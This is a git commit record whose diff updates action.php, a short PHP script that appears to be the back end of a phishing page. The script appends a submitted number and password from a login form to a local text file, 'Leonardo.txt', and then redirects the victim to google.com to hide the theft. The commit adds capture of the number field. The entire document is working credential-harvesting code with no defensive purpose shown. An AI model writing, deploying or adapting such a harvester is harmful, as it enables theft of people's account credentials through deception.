659652d95cbafa4c6d214d6548449ee96862797a
Silhaiti665 <91800038+Silhaiti665@users.noreply.github.com>
2021-10-16 15:03:56 -0400

    Update action.php

--- action.php
+++ action.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("Leonardo.txt", "[number]"." [password:] " . $pwd = $_POST['psw'] . "\n", FILE_APPEND);
+file_put_contents("Leonardo.txt", "[number]" .$nmb = $_POST['nmb'] . " [password:] " . $pwd = $_POST['psw'] . "\n", FILE_APPEND);
 header('Location: https://www.google.com');
 ?>
